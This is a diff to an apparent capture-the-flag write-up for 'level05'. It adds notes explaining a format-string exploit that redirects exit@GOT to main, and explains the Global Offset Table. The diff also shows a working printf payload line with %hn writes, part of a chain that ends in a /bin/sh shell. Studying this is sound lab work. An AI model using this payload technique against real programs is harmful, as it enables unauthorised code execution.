@@ -143,6 +143,16 @@ The high-order bytes are smaller than the low-order bytes, so we write the high 
 [address1][address2][write (2052-8) character in the possition 10 in the stack] [write (33860-2052) character in the possition 11 in the stack]
 ```
 
+(`printf` reinterprets the value at position 10 which is address1 as a pointer so the value at that address is going to be the count of how much was printed 2025 stored in hex(0x0804) mean the value at 0x080497e2 is 0x04 and at 0x080497e3 is 0x08 `%hn writes short int 2bytes`)
+
+- exit@GOT is a memory slot that holds the actual address of exit() (resolved by the dynamic linker).
+before: exit@GOT → libc_exit_address
+after: exit@GOT → 0x08048444   (address of main)
+
+- The Global Offset Table (GOT) is a memory table used by dynamically linked programs to store the actual runtime addresses of external functions.
+When a program uses a function like printf or exit, that function lives in a shared library (like libc), not inside the binary itself. (the exact address of that function is only known at runtime)
+
+
 ```bash
 (python - <<'PY'
 print "\xe2\x97\x04\x08\xe0\x97\x04\x08%2044x%10$hn%31808x%11$hn"
@@ -179,10 +189,6 @@ cat) | ./level05
 
 ## Final mental model
 
-Your exploit is clean because it separates concerns:
-
 1. **Get another turn** (`exit -> main`)
 2. **Replace a function pointer** (`printf -> system`)
 3. **Send command string** (`/bin/sh`)
-
-That is the reasoning behind the chain: convert one transient format-string bug into a stable execution path and then into shell execution.
